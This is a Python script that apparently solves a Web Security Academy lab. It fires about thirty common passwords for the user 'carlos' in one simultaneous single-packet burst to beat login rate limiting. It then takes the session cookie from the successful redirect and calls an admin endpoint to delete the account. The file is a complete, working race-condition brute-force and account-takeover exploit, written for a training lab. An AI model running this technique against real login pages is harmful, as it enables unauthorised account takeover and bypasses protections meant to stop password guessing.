from web_security_academy.core.async_lab_session import AsyncLabSession
from web_security_academy.core.logger import logger

from urllib.parse import urljoin
from requests import Request

import re


def solve_lab(session):
    passwords = []
    passwords += ["123123", "abc123", "football", "monkey", "letmein"]
    passwords += ["shadow", "master", "666666", "qwertyuiop", "123321"]
    passwords += ["mustang", "123456", "password", "12345678", "qwerty"]
    passwords += ["123456789", "12345", "1234", "111111", "1234567"]
    passwords += ["dragon", "1234567890", "michael", "x654321", "superman"]
    passwords += ["1qaz2wsx", "baseball", "7777777", "121212", "000000"]

    csrf = session.get_csrf_token("/login")
    logger.info("Attempting simultaneous logins as carlos with each password...")

    prepped = []
    for password in passwords:
        data = {"csrf": csrf, "username": "carlos", "password": password}
        req = Request("POST", urljoin(session.url, "/login"), data=data)
        prepped.append(session.prepare_request(req))
    responses = session.single_packet_send(*prepped)

    for i, resp in enumerate(responses):
        logger.debug(resp["headers"])
        if int(resp["headers"][":status"]) == 302:
            password = passwords[i]
            logger.info(f"Found carlos's password: {password}")
            break
    else:
        logger.failure("Unable to find carlos's password")
        return

    regex = re.compile(r"session=([^;]+)")
    cookie = regex.search(resp["headers"]["set-cookie"]).group(1)
    session.cookies.clear_session_cookies()
    session.cookies.set("session", cookie)

    session.get_path("/admin/delete?username=carlos")
    logger.info('Deleted user "carlos"')
